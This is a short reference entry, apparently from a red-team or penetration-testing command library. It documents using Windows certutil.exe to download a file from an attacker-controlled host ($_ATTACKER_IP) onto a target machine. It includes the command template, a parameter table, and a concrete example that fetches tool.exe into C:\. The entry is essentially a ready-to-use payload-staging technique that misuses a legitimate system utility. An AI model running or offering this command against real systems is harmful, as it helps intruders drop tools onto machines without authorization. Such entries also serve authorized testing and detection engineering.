---
id: 44b5cb18-b166-455a-a4b2-5827fc1ea622
name: certutil-download-http
type: command
executor: command_prompt
data: >-
  certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/$_FILENAME"
  "$_PATH\$_FILENAME"
output: 'CertUtil: -URLCache command completed successfully.'
created_at: '2019-11-25T22:00:53.902277+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - download
  - http
verified: true
validated: true
---

# certutil-download-http

## Command

```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/$_FILENAME" "$_PATH\$_FILENAME"
```

## Description

Downloads file from HTTP using certutil.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -urlcache -split -f | Force download | Yes |
| http://... | URL | Yes |
| $_PATH\$_FILENAME | Local path | Yes |

## Examples

### Basic Usage

```command_prompt
certutil.exe -urlcache -split -f "http://10.0.0.1/tool.exe" "C:\tool.exe"
```

## Expected Output

Download success.
